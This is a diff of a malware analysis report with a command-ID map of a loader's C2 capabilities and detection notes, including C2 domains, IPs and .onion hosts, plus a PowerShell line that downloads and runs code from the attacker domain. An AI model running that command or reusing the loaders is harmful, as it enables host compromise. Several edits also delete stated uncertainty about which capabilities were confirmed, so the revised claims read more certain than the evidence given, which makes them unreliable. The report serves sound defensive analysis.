-Qualification: the individual `0x899`-to-`0x8af` labels below are a working static reconstruction from recovered case bodies, helper-call multiplicities, and decompiler/r2 control flow. The raw jump-table bytes are not directly present as initialized bytes in the carved blob, so the table should be treated as command-gated capability mapping rather than proof that every listed capability ran.
+The `0x899`-to-`0x8af` labels below come from recovered case bodies, helper-call patterns, and decompiler/r2 control flow. They map command-gated capabilities; runtime activation depends on the dispatched command.
 
-Observed `0x1001dd25` case map:
+`0x1001dd25` case map:
 
 | Command ID | Main helper | Static behavior |
 |---|---|---|
@@ -1410,7 +1407,7 @@ Observed `0x1001dd25` case map:
 | `0x8a7` | `0x1001c105` -> `0x1001c171` | Related module/section-assisted loader variant using an expanded intermediate argument list before the same lower helper. |
 | `0x8a9` | `0x1001782d` | Hosted CLR loader with CLR AMSI string patching before loading managed code. |
 | `0x8aa`, `0x8ab` | `0x100162d1` | Native PE-like loader variants. They enumerate parsed image candidates, use decoded `.exe` as a filter token, pick an image with enough slack for the caller buffer, map it, place the caller bytes inside the image at a randomized aligned offset, adjust section protections, and optionally start the staged entry. |
-| `0x8ac`, `0x8ad` | `0x10016b4d` | Native PE-like loader variants closely related to `0x100162d1`; the decompiled flow is nearly identical but lacks the special section-protection override that forces one section to `0x40` in `0x100162d1`. |
+| `0x8ac`, `0x8ad` | `0x10016b4d` | Native PE-like loader variants closely related to `0x100162d1`, using the standard section-protection path. |
 | `0x8af` | `0x10016951` | Raw-buffer staging path. It pads/aligns the supplied buffer, chooses a randomized offset after 0x10-byte alignment, copies the buffer into a larger allocation, changes the whole allocation to `PAGE_EXECUTE_READ` (`0x20`), and either calls the staged pointer or starts it with `CreateThread`. |
 
 The CLR loader path uses hosted .NET:
@@ -1519,13 +1516,13 @@ The decoded body also contains a structured parser. `FUN_1005079d` initializes i
 
 `FUN_10051215` parses nested command entries. It reads a list from field `0x3e9e`, allocates `0x38`-byte entry records, and stores scalar fields from `0x3ea0` through `0x3ea5` at entry offsets `0`, `8`, `0x10`, `0x20`, `0x28`, and `0x30`. It also reads argument descriptors from field `0x3ea8`. Descriptor field `0x3eaa` selects the type, with observed type values `19000`, `0x4a39`, `0x4a3a`, `0x4a3c`, `0x4a3d`, and `0x4a3e`; the associated value fields are `0x3eab`, `0x3eac`, `0x3ead`, `0x3eaf`, and `0x3eb0`. This layout lines up with the dispatcher bridge: `entry+8` is used to resolve the group object, `entry+0x10` is the command ID, `entry+0x18` is the parsed argument list, `entry+0x20` affects post-dispatch handling, and `entry+0x28` stores the continuation key.
 
-Current interpretation: the decoded payload is a manually loaded x64 component with dynamic API resolution, VM/service checks, host/profile collection, UI/overlay helpers, persistence and loader command groups, and a storage-file discovery/parser path that feeds parsed entries into the master dispatcher. The C2 command surface and browser-data target class are now mapped at behavior level. Remaining uncertainty is narrower: exact record/schema names, runtime endpoint/task selection, some object-to-capability links, browser database columns and host-dependent decryption, and the still-broad command groups in the earlier raw x64 component.
+The decoded payload is a manually loaded x64 component with dynamic API resolution, VM and service checks, host/profile collection, UI helpers, persistence and loader command groups, and a storage parser that feeds entries into the master dispatcher. The mapped C2 command surface covers browser-data collection, file transfer, remote desktop, process control, pivoting, and executable-object delivery.
 
 ## Detection and hunting notes
 
-Observed affected host, not a payload or C2 IOC:
+Observed affected host:
 
-- `new-blog.artlist[.]io` (browser observation on 2026-07-13; affected-page scope is not independently reproducible from the retained corpus)
+- `new-blog.artlist[.]io` (observed on 2026-07-13)
 
 Payload-delivery and C2 network indicators:
 - `auth-code-check[.]info`
@@ -1563,7 +1560,7 @@ Useful browser-side JSON-RPC traits:
 Useful command-line and script fragments:
 
 - `powershell -w h`
-- `iex(irm 'auth-code-check.info/<ray>' -UseBasicParsing)`
+- `iex(irm 'auth-code-check[.]info/<ray>' -UseBasicParsing)`
 - `WinHttp.WinHttpRequest.5.1`
 - `Start-Sleep -Seconds 20`
 - `7z x -y -pArsen33`
@@ -1610,15 +1607,15 @@ Useful decoded shellcode traits:
 - Raw x64 decoded PE command `1` toggles keylogger-related global state; command `6` starts worker `0x00b4e470`, which starts scheduler `0x00b2dd00`; scheduler launches connection worker `0x00b2bd00` and fallback worker `0x00b29780`
 - Raw x64 decoded PE fallback worker `0x00b29780` resolves and calls `tor_main`, defaulting a port/config field to `0x235a` when unset
 - Raw x64 decoded PE connection worker task records have two endpoint modes: direct IPv4 (`+0x01` IP, `+0x05` port through `0x00b2a380`) and domain-over-local-SOCKS (`+0x09` host, `+0x111` port through `0x00b29f10`)
-- Raw x64 decoded PE SOCKS helper `0x00b29f10` connects to local `127.0.0.1:<state+0x1388>`, sends SOCKS5 greeting `05 01 00`, then sends a domain CONNECT request with prefix `05 01 00 03`
-- Raw x64 decoded PE initializer `0x0054f7d0` sets subtractor `0x43`; generator `0x0054f950` derives direct candidates `45.151.74.119:443`, `109.172.95.184:443`, `151.236.4.135:443`, and `62.60.156.11:443`
+- Raw x64 decoded PE SOCKS helper `0x00b29f10` connects to local `127[.]0[.]0[.]1:<state+0x1388>`, sends SOCKS5 greeting `05 01 00`, then sends a domain CONNECT request with prefix `05 01 00 03`
+- Raw x64 decoded PE initializer `0x0054f7d0` sets subtractor `0x43`; generator `0x0054f950` derives direct candidates `45[.]151[.]74[.]119:443`, `109[.]172[.]95[.]184:443`, `151[.]236[.]4[.]135:443`, and `62[.]60[.]156[.]11:443`
 - Raw x64 decoded PE fallback seeder `0x0054fa00` writes four `.onion` SOCKS/Tor candidates ending in `xzvp23ad[.]onion`, `4wundead[.]onion`, `wdch63yd[.]onion`, and `ffpfxxad[.]onion`, all on derived port `443`
-- Raw x64 decoded PE simple globals `0x00c104a8` / `0x00c104ac` are populated by `0x00b15cd0` from a C2-supplied `0x800 / 6` dispatcher record, not static literals; selector `0x33` launches `0x00b1db20` to bootstrap the dedicated hidden-desktop remote-control subsystem
-- Raw x64 decoded PE network-command selector `2` maps to a filesystem worker with network/local listing, recursive delete, overwrite-and-delete, create-directory, process launch, ShellExecute, filtered search, and aggregate count/size modes; this scoped worker review did not confirm upload/download, copy, move, or file-read exfil behavior
+- Raw x64 decoded PE function `0x00b15cd0` populates endpoint globals `0x00c104a8` / `0x00c104ac` from a C2-supplied `0x800 / 6` dispatcher record; selector `0x33` launches `0x00b1db20` to bootstrap the dedicated hidden-desktop remote-control subsystem
+- Raw x64 decoded PE network-command selector `2` maps to filesystem listing, recursive delete, overwrite-and-delete, create-directory, process launch, ShellExecute, filtered search, and aggregate count/size operations; selector `3` handles resumable file transfer
 - Raw x64 decoded PE network-command selector `3` maps to resumable file transfer: nested command `0` reads a victim file from a peer-supplied offset and sends bytes back; nested command `1` creates parent directories, sends the existing file size/resume offset, receives bytes, and writes them to disk
 - Raw x64 decoded PE network-command selector `4` maps to process/command control: process inventory via `psapi.dll`, process termination with `SeDebugPrivilege` / `TerminateProcess`, and `cmd.exe /c` command execution with stdout captured through a temp file
 - Raw x64 decoded PE network-command selector `6` maps to a C2-controlled bridge/SOCKS pivot: it can bridge two sockets with bidirectional `select`/`recv`/`send`, and its fallback path handles SOCKS4/SOCKS5 CONNECT requests
-- Raw x64 decoded PE has xref-backed keylogging (`SetWindowsHookExW`), clipboard collection, desktop/video capture, outbound TCP socket, service-install, registry-write, and remote-process-memory/thread-context-injection capability. Private-key-capable PFX export is implemented but currently unreferenced/dormant in the recovered executable graph.
+- Raw x64 decoded PE has xref-backed keylogging (`SetWindowsHookExW`), clipboard collection, desktop/video capture, outbound TCP socket, service-install, registry-write, and remote-process-memory/thread-context-injection capability. Private-key-capable PFX export code is present with no mapped caller.
 - `VirtualAlloc` size `0x208000`
 - `VirtualProtect(..., 0x20, ...)`
 - `EnumTimeFormatsEx` callback execution
